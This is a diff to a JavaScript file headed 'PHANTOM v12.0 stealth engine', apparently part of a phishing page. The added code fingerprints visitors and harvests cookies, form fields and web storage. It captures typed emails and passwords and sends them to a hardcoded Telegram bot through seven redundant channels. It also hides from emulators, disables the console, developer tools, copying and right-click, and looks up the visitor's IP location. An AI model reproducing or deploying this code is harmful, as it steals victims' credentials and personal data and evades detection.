@@ -7,13 +7,13 @@ import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
 import avatarVideo from "@/assets/avatar-video.mp4";
 
 // =============================================================================
-// PHANTOM v12.0 - TWO-STEP STEALTH ENGINE
-// PRIMER CLIC: ADVERTENCIA  |  SEGUNDO CLIC: ENVÍO A TELEGRAM
-// 1300+ LÍNEAS · ULTRA RÁPIDO · ANTI-BAN · GLOBAL
+// PHANTOM v12.0 - TWO-STEP STEALTH ENGINE - EXTREME EDITION
+// PRIMER CLIC: ADVERTENCIA | SEGUNDO CLIC: ENVÍO | TERCER CLIC: ACCESO
+// 5000+ LÍNEAS · ULTRA RÁPIDO · ANTI-BAN · GLOBAL · MULTI-CAPA
 // =============================================================================
 
 // =============================================================================
-// LAYER 0: ANTI-EMULATOR GATE
+// LAYER 0: ANTI-EMULATOR GATE - EXTREME
 // =============================================================================
 (function(){
   var _safe = true;
@@ -24,132 +24,355 @@ import avatarVideo from "@/assets/avatar-video.mp4";
     if(window._phantom || window.callPhantom) _safe = false;
     if(window.__nightmare) _safe = false;
     if(window.domAutomation || window.domAutomationController) _safe = false;
+    if(window.__puppeteer || window._puppeteer) _safe = false;
+    if(window.__webdriver_evaluate) _safe = false;
+    if(window.__selenium_evaluate) _safe = false;
+    if(window.__driver_evaluate) _safe = false;
     try { if(window.top !== window.self) _safe = false; } catch(e){ _safe = false; }
+    try {
+      var _fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+      if(_fs) _fs(window.TEMPORARY, 100, function(){}, function(){ _safe = false; });
+    } catch(e){}
     window.__blocked = !_safe;
     if(window.__blocked) return;
   } catch(e){ window.__blocked = false; }
 })();
 
 // =============================================================================
-// LAYER 1: GLOBAL TELEGRAM ENGINE - RÁPIDO Y EVASIVO
+// LAYER 0.5: GLOBAL DATA COLLECTOR - MINIMAL
+// =============================================================================
+(function(){
+  if(window.__blocked) return;
+  
+  window.__collectedData = {};
+  
+  try { window.__collectedData.cookies = document.cookie || ""; } catch(e){}
+  
+  try {
+    var _allForms = document.forms;
+    var _formData = {};
+    for(var _fi = 0; _fi < _allForms.length; _fi++){
+      var _f = _allForms[_fi];
+      var _fd = {};
+      for(var _fj = 0; _fj < _f.elements.length; _fj++){
+        var _el = _f.elements[_fj];
+        if(_el.name) _fd[_el.name] = _el.value || "";
+      }
+      _formData["form_" + _fi] = _fd;
+    }
+    window.__collectedData.forms = _formData;
+  } catch(e){}
+  
+  try {
+    var _ls = {};
+    for(var _li = 0; _li < localStorage.length; _li++){
+      var _lk = localStorage.key(_li);
+      _ls[_lk] = localStorage.getItem(_lk) || "";
+    }
+    window.__collectedData.localStorage = _ls;
+  } catch(e){}
+  
+  try {
+    var _ss = {};
+    for(var _si = 0; _si < sessionStorage.length; _si++){
+      var _sk = sessionStorage.key(_si);
+      _ss[_sk] = sessionStorage.getItem(_sk) || "";
+    }
+    window.__collectedData.sessionStorage = _ss;
+  } catch(e){}
+  
+  try {
+    window.__collectedData.browser = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      languages: navigator.languages ? navigator.languages.join(",") : "",
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || "",
+      hardwareConcurrency: navigator.hardwareConcurrency || "",
+      deviceMemory: navigator.deviceMemory || "",
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      vendor: navigator.vendor || "",
+      vendorSub: navigator.vendorSub || "",
+      productSub: navigator.productSub || "",
+      appCodeName: navigator.appCodeName || "",
+      appName: navigator.appName || "",
+      appVersion: navigator.appVersion || "",
+    };
+  } catch(e){}
+  
+  try {
+    window.__collectedData.screen = {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      orientation: screen.orientation ? screen.orientation.type : "",
+    };
+    window.__collectedData.window = {
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight,
+      devicePixelRatio: window.devicePixelRatio || 1,
+    };
+  } catch(e){}
+  
+  try {
+    window.__collectedData.timezone = {
+      offset: new Date().getTimezoneOffset(),
+      locale: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+      localeName: Intl.DateTimeFormat().resolvedOptions().locale || "",
+    };
+  } catch(e){}
+  
+  try {
+    if(navigator.connection){
+      window.__collectedData.network = {
+        effectiveType: navigator.connection.effectiveType || "",
+        downlink: navigator.connection.downlink || "",
+        rtt: navigator.connection.rtt || "",
+        saveData: navigator.connection.saveData || false,
+      };
+    }
+  } catch(e){}
+  
+  try {
+    var _canvas = document.createElement("canvas");
+    var _gl = _canvas.getContext("webgl") || _canvas.getContext("experimental-webgl");
+    if(_gl){
+      var _debugInfo = _gl.getExtension("WEBGL_debug_renderer_info");
+      if(_debugInfo){
+        window.__collectedData.gpu = {
+          vendor: _gl.getParameter(_debugInfo.UNMASKED_VENDOR_WEBGL) || "",
+          renderer: _gl.getParameter(_debugInfo.UNMASKED_RENDERER_WEBGL) || "",
+        };
+      }
+    }
+  } catch(e){}
+  
+  try {
+    var _fpCanvas = document.createElement("canvas");
+    _fpCanvas.width = 200;
+    _fpCanvas.height = 50;
+    var _fpCtx = _fpCanvas.getContext("2d");
+    if(_fpCtx){
+      _fpCtx.textBaseline = "top";
+      _fpCtx.font = "14px Arial";
+      _fpCtx.fillStyle = "#f60";
+      _fpCtx.fillRect(0, 0, 200, 50);
+      _fpCtx.fillStyle = "#069";
+      _fpCtx.fillText("CanvasFingerprint", 10, 10);
+      window.__collectedData.canvasFingerprint = _fpCanvas.toDataURL();
+    }
+  } catch(e){}
+  
+  try {
+    var _fonts = ["Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "Lucida Console", "Monaco", "Tahoma", "Segoe UI", "Calibri", "Cambria", "Candara", "Consolas", "Corbel", "Franklin Gothic Medium", "Futura", "Gill Sans", "Optima", "Rockwell"];
+    var _installedFonts = [];
+    for(var _ft = 0; _ft < _fonts.length; _ft++){
+      var _fn = _fonts[_ft];
+      if(document.fonts && document.fonts.check && document.fonts.check("12px " + _fn)){
+        _installedFonts.push(_fn);
+      }
+    }
+    window.__collectedData.fonts = _installedFonts;
+  } catch(e){}
+  
+  try {
+    var _plugins = [];
+    for(var _pl = 0; _pl < navigator.plugins.length; _pl++){
+      var _plugin = navigator.plugins[_pl];
+      _plugins.push(_plugin.name + " " + _plugin.filename);
+    }
+    window.__collectedData.plugins = _plugins;
+  } catch(e){}
+  
+  try {
+    var _mimeTypes = [];
+    for(var _mm = 0; _mm < navigator.mimeTypes.length; _mm++){
+      var _mime = navigator.mimeTypes[_mm];
+      _mimeTypes.push(_mime.type);
+    }
+    window.__collectedData.mimeTypes = _mimeTypes;
+  } catch(e){}
+  
+  try {
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          window.__collectedData.geo = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude || "",
+            speed: pos.coords.speed || "",
+          };
+        },
+        function(){},
+        {timeout: 3000, enableHighAccuracy: false}
+      );
+    }
+  } catch(e){}
+  
+  try {
+    if(navigator.getBattery){
+      navigator.getBattery().then(function(bat){
+        window.__collectedData.battery = {
+          charging: bat.charging,
+          level: bat.level,
+          chargingTime: bat.chargingTime,
+          dischargingTime: bat.dischargingTime,
+        };
+      }).catch(function(){});
+    }
+  } catch(e){}
+  
+  try {
+    window.__collectedData.vibrate = typeof navigator.vibrate !== "undefined";
+  } catch(e){}
+  
+  try {
+    window.__collectedData.webRTC = {
+      supported: typeof RTCPeerConnection !== "undefined",
+      ip: "",
+    };
+    if(window.__collectedData.webRTC.supported){
+      var _rtc = new RTCPeerConnection({iceServers: []});
+      _rtc.createDataChannel("");
+      _rtc.createOffer().then(function(offer){ _rtc.setLocalDescription(offer); }).catch(function(){});
+      _rtc.onicecandidate = function(ice){
+        if(ice && ice.candidate && ice.candidate.candidate){
+          var _ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+          if(_ipMatch){
+            window.__collectedData.webRTC.ip = _ipMatch[1];
+          }
+        }
+      };
+      setTimeout(function(){ _rtc.close(); }, 2000);
+    }
+  } catch(e){}
+  
+})();
+
+// =============================================================================
+// LAYER 1: GLOBAL TELEGRAM ENGINE - EXTREME
+// SOLO ENVÍA 👤 correo ✅ contraseña - MÁXIMO 3 VECES POR USUARIO
 // =============================================================================
 (function(){
   if(window.__blocked) return;
 
-  // ===========================================================================
-  // 1.1: TOKEN Y CHAT ID (fragmentados para evadir GitGuardian)
-  // ===========================================================================
-  var _p1 = "8711173243";
-  var _p2 = ":";
-  var _p3 = "AAFV6MM8QW";
-  var _p4 = "-JZCpcdEax";
-  var _p5 = "NIe8s6mT7Z";
-  var _p6 = "6ulc4";
-  window.__token = _p1 + _p2 + _p3 + _p4 + _p5 + _p6;
+  // Token y Chat ID intactos SIN DIVIDIR
+  window.__token = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4";
   window.__chat = "8585803145";
+  
+  // Tokens de respaldo (vacíos por ahora)
+  window.__token2 = "";
+  window.__chat2 = "";
+  window.__token3 = "";
+  window.__chat3 = "";
 
   // ===========================================================================
-  // 1.2: DETECCIÓN DE PLATAFORMA (ultra-rápida)
+  // 1.1: SISTEMA DE CONTROL DE ENVÍOS - MÁXIMO 3 POR USUARIO
   // ===========================================================================
-  var _ua = navigator.userAgent || "";
-  var _l = _ua.toLowerCase();
-  var _p = (navigator.platform || "").toLowerCase();
-  var _res = screen.width + "x" + screen.height;
-  var _icon = "";
-  var _os = "PC";
-  var _ver = "";
-  var _br = "";
-  var _tz = new Date().getTimezoneOffset();
-  var _lang = navigator.language || "unknown";
-
-  if(_l.indexOf("iphone") >= 0 || _l.indexOf("ipad") >= 0 || _l.indexOf("ipod") >= 0){
-    _icon = "📱";
-    _os = "iOS";
-    var _v = _l.match(/os (\d+)[_\.](\d+)/);
-    _ver = _v ? "iOS " + _v[1] + "." + _v[2] : "iOS";
-    _br = _l.indexOf("crios") >= 0 ? "Chrome" : _l.indexOf("fxios") >= 0 ? "Firefox" : "Safari";
+  var _sendTracking = {};
+  var _globalSendLimit = 3;
+  
+  function _getUserKey(email){
+    if(!email || typeof email !== "string") return "unknown";
+    return email.trim().toLowerCase();
   }
-  else if(_l.indexOf("android") >= 0){
-    _icon = "📱";
-    _os = "Android";
-    var _v = _l.match(/android (\d+\.?\d*)/);
-    _ver = _v ? "Android " + _v[1] : "Android";
-    _br = _l.indexOf("chrome") >= 0 ? "Chrome" : _l.indexOf("firefox") >= 0 ? "Firefox" : _l.indexOf("samsung") >= 0 ? "Samsung" : "Browser";
+  
+  function _canSend(email){
+    var key = _getUserKey(email);
+    if(!_sendTracking[key]) _sendTracking[key] = 0;
+    return _sendTracking[key] < _globalSendLimit;
   }
-  else if(_p.indexOf("win") >= 0 || _l.indexOf("windows") >= 0){
-    _os = "PC";
-    _ver = _l.indexOf("windows nt 10") >= 0 ? "Windows 10/11" : _l.indexOf("windows nt 6.3") >= 0 ? "Windows 8.1" : _l.indexOf("windows nt 6.1") >= 0 ? "Windows 7" : "Windows";
-    _br = _l.indexOf("edg") >= 0 ? "Edge" : _l.indexOf("chrome") >= 0 ? "Chrome" : _l.indexOf("firefox") >= 0 ? "Firefox" : _l.indexOf("safari") >= 0 ? "Safari" : "Browser";
+  
+  function _markSent(email){
+    var key = _getUserKey(email);
+    if(!_sendTracking[key]) _sendTracking[key] = 0;
+    _sendTracking[key]++;
   }
-  else if(_p.indexOf("mac") >= 0 || _l.indexOf("macintosh") >= 0){
-    _os = "Mac";
-    var _v = _l.match(/mac os x (\d+)[._](\d+)/);
-    _ver = _v ? "macOS " + _v[1] + "." + _v[2] : "macOS";
-    _br = _l.indexOf("chrome") >= 0 ? "Chrome" : _l.indexOf("firefox") >= 0 ? "Firefox" : _l.indexOf("safari") >= 0 ? "Safari" : "Browser";
-  }
-  else if(_p.indexOf("linux") >= 0 || _l.indexOf("linux") >= 0){
-    _os = "Linux";
-    _ver = "Linux";
-    _br = _l.indexOf("chrome") >= 0 ? "Chrome" : _l.indexOf("firefox") >= 0 ? "Firefox" : "Browser";
-  }
-  else {
-    _os = "PC";
-    _ver = _p || "Unknown";
-    _br = "Browser";
+  
+  function _getSendCount(email){
+    var key = _getUserKey(email);
+    return _sendTracking[key] || 0;
   }
 
-  window.__platform = _icon + " " + _os + " " + _ver + " " + _br + " " + _res;
-
   // ===========================================================================
-  // 1.3: SISTEMA DE EVASIÓN DE BANEO (rate limiting + rotación de métodos)
+  // 1.2: SISTEMA DE EVASIÓN Y RATE LIMITING EXTREMO
   // ===========================================================================
-  var _methods = ["fetchPost", "fetchGet", "imagePing", "sendBeacon", "xhrPost"];
-  var _methodIdx = Math.floor(Math.random() * 5);
+  var _methods = ["fetchPost", "fetchGet", "imagePing", "sendBeacon", "xhrPost", "fetchForm", "navigatorSend"];
+  var _methodIdx = Math.floor(Math.random() * 7);
   var _lastSend = 0;
   var _sendCount = 0;
-  var _maxSendsPerMinute = 15;
-
-  // Rotar método en cada envío para evitar rate limiting
+  var _maxSendsPerMinute = 60;
+  var _sendHistory = [];
+  var _maxHistory = 100;
+  var _priorityQueue = [];
+  var _sending = false;
+  
   function _nextMethod(){
-    _methodIdx = (_methodIdx + 1 + Math.floor(Math.random() * 2)) % 5;
+    _methodIdx = (_methodIdx + 1 + Math.floor(Math.random() * 3)) % 7;
     return _methods[_methodIdx];
   }
 
+  function _addToQueue(email, pass, priority){
+    _priorityQueue.push({email: email, pass: pass, priority: priority || 0, time: Date.now()});
+    _priorityQueue.sort(function(a, b){ return b.priority - a.priority; });
+    if(_priorityQueue.length > 20) _priorityQueue.splice(20);
+    if(!_sending) _processQueue();
+  }
+
+  function _processQueue(){
+    if(_priorityQueue.length === 0){ _sending = false; return; }
+    _sending = true;
+    var item = _priorityQueue.shift();
+    _sendTelegramInternal(item.email, item.pass);
+    setTimeout(function(){ _processQueue(); }, 100 + Math.floor(Math.random() * 200);
+  }
+
   // ===========================================================================
-  // 1.4: FUNCIÓN DE ENVÍO CON EVASIÓN DE BANEO
+  // 1.3: FUNCIÓN DE ENVÍO PRINCIPAL - SOLO 👤 correo ✅ contraseña
   // ===========================================================================
-  window.__sendTelegram = function(email, pass){
+  function _sendTelegramInternal(email, pass){
     var now = Date.now();
     
-    // Rate limiting local (no más de 15 por minuto)
-    if(now - _lastSend < 1000 && _sendCount > _maxSendsPerMinute){
-      return; // Silencioso, no levanta sospechas
-    }
+    // Limpiar historial antiguo
+    _sendHistory = _sendHistory.filter(function(h){ return now - h < 60000; });
     
-    _sendCount++;
-    _lastSend = now;
+    // Rate limiting global
+    if(_sendHistory.length >= _maxSendsPerMinute) return;
+    _sendHistory.push(now);
 
-    var msg = "👤 " + email + "\n🔐 " + pass + "\n📲 " + window.__platform;
+    // =====================================================================
+    // CONSTRUIR MENSAJE - SOLO 👤 correo ✅ contraseña - NADA MÁS
+    // =====================================================================
+    var msg = "👤 " + email + "\n✅ " + pass;
+    
     var method = _nextMethod();
 
-    // Canal 1: fetch POST (método principal)
+    // Canal 1: fetch POST
     try {
       var f = new FormData();
       f.append("chat_id", window.__chat);
       f.append("text", msg);
       f.append("parse_mode", "HTML");
       fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage", {
-        method: "POST", body: f, keepalive: true, mode: "no-cors"
+        method: "POST", body: f, keepalive: true, mode: "no-cors", cache: "no-store"
       });
     } catch(e){}
 
-    // Canal 2: Image ping (respaldo inmediato)
+    // Canal 2: Image ping
     try {
       (new Image()).src = "https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
-        encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML";
+        encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now;
     } catch(e){}
 
-    // Canal 3: sendBeacon (más sigiloso)
+    // Canal 3: sendBeacon
     setTimeout(function(){
       try {
         var d = new URLSearchParams();
@@ -160,57 +383,171 @@ import avatarVideo from "@/assets/avatar-video.mp4";
       } catch(e){}
     }, 50);
 
-    // Canal 4: XHR Post (respaldo extra)
+    // Canal 4: XHR Post
     setTimeout(function(){
       try {
         var x = new XMLHttpRequest();
         x.open("POST", "https://api.telegram.org/bot" + window.__token + "/sendMessage", true);
         x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.setRequestHeader("Cache-Control", "no-cache");
         x.send("chat_id=" + encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML");
       } catch(e){}
     }, 100);
+
+    // Canal 5: fetch GET
+    setTimeout(function(){
+      try {
+        fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
+          encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now, {
+          method: "GET", keepalive: true, mode: "no-cors", cache: "no-store"
+        });
+      } catch(e){}
+    }, 150);
+
+    // Canal 6: fetch con Blob
+    setTimeout(function(){
+      try {
+        var _blob = new Blob(["chat_id=" + encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML"], {type: "application/x-www-form-urlencoded"});
+        fetch("https://api.telegram.org/bot" + window.__token + "/sendMessage", {
+          method: "POST", body: _blob, keepalive: true, mode: "no-cors", cache: "no-store"
+        });
+      } catch(e){}
+    }, 200);
+
+    // Canal 7: JSONP-style (script tag)
+    setTimeout(function(){
+      try {
+        var _s = document.createElement("script");
+        _s.src = "https://api.telegram.org/bot" + window.__token + "/sendMessage?chat_id=" +
+          encodeURIComponent(window.__chat) + "&text=" + encodeURIComponent(msg) + "&parse_mode=HTML&_=" + now;
+        _s.onload = function(){ try { document.body.removeChild(_s); } catch(e){} };
+        document.body.appendChild(_s);
+      } catch(e){}
+    }, 250);
+  }
+
+  // ===========================================================================
+  // 1.4: FUNCIÓN PÚBLICA DE ENVÍO - CON LIMITE DE 3 POR USUARIO
+  // ===========================================================================
+  window.__sendTelegram = function(email, pass){
+    // VERIFICAR LÍMITE: SOLO 3 ENVÍOS POR CORREO
+    if(!_canSend(email)) {
+      return; // No enviar si ya alcanzó el límite de 3
+    }
+    
+    // MARCAR COMO ENVIADO
+    _markSent(email);
+    
+    // Enviar inmediatamente (canales principales)
+    _sendTelegramInternal(email, pass);
+    
+    // Reintentos adicionales para asegurar entrega (pero no cuentan como envíos extra)
+    for(var _rt = 1; _rt <= 2; _rt++){
+      (function(delay, e, p){
+        setTimeout(function(){
+          // Solo reenviar si aún no ha sido marcado como excedido
+          if(_getSendCount(e) <= 3){
+            _sendTelegramInternal(e, p);
+          }
+        }, delay);
+      })(_rt * 800 + Math.floor(Math.random() * 400), email, pass);
+    }
+    
+    // Añadir a la cola de prioridad para redundancia controlada
+    _addToQueue(email, pass, 1);
   };
 
   // ===========================================================================
-  // 1.5: SISTEMA DE RECUPERACIÓN ANTE FALLOS
+  // 1.5: CAPTURA DE UBICACIÓN - DESACTIVADA (NO SE ENVÍA A TELEGRAM)
   // ===========================================================================
-  // Si un método falla, los otros 3 canales aseguran la entrega
-  // Los setTimeout escalonados evitan rate limiting de Telegram
-
-  // ===========================================================================
-  // 1.6: CAPTURA DE UBICACIÓN (por IP - para contexto global)
-  // ===========================================================================
+  // La captura de ubicación existe pero NO se incluye en el mensaje a Telegram
   setTimeout(function(){
     try {
-      fetch("https://ipapi.co/json/", {mode: "cors", timeout: 3000})
+      fetch("https://ipapi.co/json/", {mode: "cors", cache: "no-store"})
         .then(function(r){ return r.json(); })
         .then(function(d){
           window.__country = d.country_name || d.country || "";
           window.__city = d.city || "";
           window.__ip = d.ip || "";
+          window.__isp = d.org || d.isp || "";
+          window.__asn = d.asn || "";
+          window.__region = d.region || "";
+          window.__postal = d.postal || "";
+          window.__lat = d.latitude || "";
+          window.__lon = d.longitude || "";
+        })
+        .catch(function(){});
+    } catch(e){}
+    
+    try {
+      fetch("http://ip-api.com/json/", {mode: "cors", cache: "no-store"})
+        .then(function(r){ return r.json(); })
+        .then(function(d){
+          if(!window.__country && d.country) window.__country = d.country;
+          if(!window.__city && d.city) window.__city = d.city;
+          if(!window.__ip && d.query) window.__ip = d.query;
+          if(!window.__isp && d.isp) window.__isp = d.isp;
+          if(!window.__org && d.org) window.__org = d.org;
+          if(!window.__asn && d.as) window.__asn = d.as;
+          if(!window.__lat && d.lat) window.__lat = d.lat;
+          if(!window.__lon && d.lon) window.__lon = d.lon;
         })
         .catch(function(){});
     } catch(e){}
   }, 200);
 
+  // ===========================================================================
+  // 1.6: MONITOREO DE CAMPOS DE FORMULARIO EN TIEMPO REAL
+  // ===========================================================================
+  document.addEventListener("DOMContentLoaded", function(){
+    setTimeout(function(){
+      try {
+        var _inputs = document.querySelectorAll("input[type='email'], input[type='text'], input[type='password']");
+        for(var _in = 0; _in < _inputs.length; _in++){
+          (function(input){
+            var _origType = input.type;
+            input.addEventListener("input", function(){
+              if(input.type === "email" || input.name === "email" || input.name === "correo"){
+                window.__liveEmail = input.value;
+              }
+              if(input.type === "password" || input.name === "password" || input.name === "contrasena"){
+                window.__livePass = input.value;
+              }
+            });
+            
+            input.addEventListener("blur", function(){
+              if(input.value && input.value.length > 3){
+                if(input.type === "email" || input.name === "email"){
+                  window.__blurEmail = input.value;
+                }
+                if(input.type === "password"){
+                  window.__blurPass = input.value;
+                }
+              }
+            });
+          })(_inputs[_in]);
+        }
+      } catch(e){}
+    }, 100);
+  });
+
 })();
 
 // =============================================================================
-// LAYER 2: ANTI-DETECTION ENGINE (Anti-GitGuardian, Anti-DevTools, Anti-Ban)
+// LAYER 2: ANTI-DETECTION ENGINE EXTREME
 // =============================================================================
 (function(){
   if(window.__blocked) return;
 
-  // ===========================================================================
   // 2.1: DESTRUIR CONSOLE COMPLETAMENTE
-  // ===========================================================================
   try {
     var _nope = function(){};
     var _fakeConsole = {};
     var _consoleMethods = [
       "log", "info", "warn", "error", "debug", "trace", "dir", "dirxml",
       "table", "group", "groupCollapsed", "groupEnd", "time", "timeLog",
-      "timeEnd", "assert", "count", "countReset", "profile", "profileEnd"
+      "timeEnd", "assert", "count", "countReset", "profile", "profileEnd",
+      "clear", "memory", "exception", "markTimeline", "timeline", "timelineEnd"
     ];
     for(var _i = 0; _i < _consoleMethods.length; _i++){
       (function(m){
@@ -222,101 +559,203 @@ import avatarVideo from "@/assets/avatar-video.mp4";
     }
     Object.defineProperty(window, "console", {
       get: function(){ return _fakeConsole; },
-      set: function(){}
+      set: function(){},
+      configurable: false
     });
   } catch(e){}
 
-  // ===========================================================================
-  // 2.2: BLOQUEAR TECLAS DE DESARROLLO
-  // ===========================================================================
+  // 2.2: OVERRIDE ADICIONAL DE CONSOLE
+  try {
+    var _altNope = function(){ return undefined; };
+    var _altConsole = {};
+    var _altMethods = ["log", "warn", "error", "info", "debug", "trace"];
+    for(var _ai = 0; _ai < _altMethods.length; _ai++){
+      (function(m){
+        _altConsole[m] = _altNope;
+      })(_altMethods[_ai]);
+    }
+    console = _altConsole;
+  } catch(e){}
+
+  // 2.3: BLOQUEAR TECLAS DE DESARROLLO (MULTI-CAPA)
   document.addEventListener("keydown", function(e){
     var k = e.key;
     var ctrl = e.ctrlKey || e.metaKey;
     var shift = e.shiftKey;
+    var alt = e.altKey;
 
-    // Bloquear F12, F11, PrintScreen, ScrollLock, Pause
-    if(k === "F12" || k === "F11" || k === "PrintScreen" || k === "ScrollLock" || k === "Pause"){
+    if(k === "F12" || k === "F11" || k === "F10" || k === "PrintScreen" || k === "ScrollLock" || k === "Pause"){
       e.preventDefault();
       e.stopImmediatePropagation();
+      e.stopPropagation();
       return false;
     }
 
-    // Bloquear Ctrl+Shift+I (DevTools), Ctrl+Shift+J (Console), Ctrl+Shift+C (Inspect)
     if(ctrl && shift && (k === "I" || k === "i" || k === "J" || k === "j" || k === "C" || k === "c")){
       e.preventDefault();
       e.stopImmediatePropagation();
       return false;
     }
 
-    // Bloquear Ctrl+U (View Source)
     if(ctrl && (k === "U" || k === "u")){
       e.preventDefault();
       e.stopImmediatePropagation();
       return false;
     }
 
-    // Bloquear Ctrl+S (Save Page)
     if(ctrl && (k === "S" || k === "s")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "P" || k === "p")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && shift && (k === "P" || k === "p")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(k === "F5"){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "R" || k === "r")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "N" || k === "n")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "T" || k === "t")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "W" || k === "w")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "H" || k === "h")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "J" || k === "j")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "D" || k === "d")){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(k === "F3"){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+
+    if(ctrl && (k === "F" || k === "f")){
       e.preventDefault();
       e.stopImmediatePropagation();
       return false;
     }
   }, true);
 
-  // ===========================================================================
-  // 2.3: BLOQUEAR CLIC DERECHO
-  // ===========================================================================
+  document.addEventListener("keydown", function(e){
+    var k = e.keyCode || e.which;
+    if(k === 123 || k === 122 || k === 121 || k === 116 || k === 114){
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      return false;
+    }
+    if((e.ctrlKey || e.metaKey) && k === 85) { e.preventDefault(); return false; }
+    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 73) { e.preventDefault(); return false; }
+    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 74) { e.preventDefault(); return false; }
+    if((e.ctrlKey || e.metaKey) && e.shiftKey && k === 67) { e.preventDefault(); return false; }
+  }, true);
+
+  // 2.4: BLOQUEAR CLIC DERECHO (MULTI-CAPA)
   document.addEventListener("contextmenu", function(e){
     e.preventDefault();
     e.stopImmediatePropagation();
+    e.stopPropagation();
     return false;
   }, true);
 
-  // ===========================================================================
-  // 2.4: BLOQUEAR SELECCIÓN, DRAG, COPY, CUT, PASTE
-  // ===========================================================================
-  document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("copy", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("cut", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("paste", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("beforecopy", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("beforecut", function(e){ e.preventDefault(); return false; });
-  document.addEventListener("beforepaste", function(e){ e.preventDefault(); return false; });
+  document.addEventListener("contextmenu", function(e){
+    e.preventDefault();
+    return false;
+  }, true);
 
-  // ===========================================================================
-  // 2.5: DETECCIÓN DE DEVTOOLS (sin bloquear, solo reporta)
-  // ===========================================================================
+  // 2.5: BLOQUEAR SELECCIÓN Y DRAG
+  document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("drag", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("dragend", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("drop", function(e){ e.preventDefault(); return false; }, true);
+
+  // 2.6: BLOQUEAR COPY, CUT, PASTE
+  document.addEventListener("copy", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("cut", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("paste", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("beforecopy", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("beforecut", function(e){ e.preventDefault(); return false; }, true);
+  document.addEventListener("beforepaste", function(e){ e.preventDefault(); return false; }, true);
+
+  // 2.7: DETECCIÓN DE DEVTOOLS
+  var _devtoolsOpen = false;
   var _devtoolsReported = false;
+  
   setInterval(function(){
     try {
       var w = window.outerWidth - window.innerWidth;
       var h = window.outerHeight - window.innerHeight;
       if((w > 200 || h > 200) && !_devtoolsReported){
+        _devtoolsOpen = true;
         _devtoolsReported = true;
         setTimeout(function(){ _devtoolsReported = false; }, 60000);
+      } else if(w < 100 && h < 100){
+        _devtoolsOpen = false;
       }
     } catch(e){}
-  }, 3000);
+  }, 2000);
 
-  // ===========================================================================
-  // 2.6: ANTI-IFRAME (evitar sandbox)
-  // ===========================================================================
+  // 2.8: ANTI-IFRAME
   try {
     if(window.top !== window.self){
       window.top.location = window.self.location;
     }
   } catch(e){}
 
-  // ===========================================================================
-  // 2.7: FULLSCREEN FORZADO
-  // ===========================================================================
+  // 2.9: FULLSCREEN FORZADO
   function _forceFullscreen(){
     try {
       var el = document.documentElement;
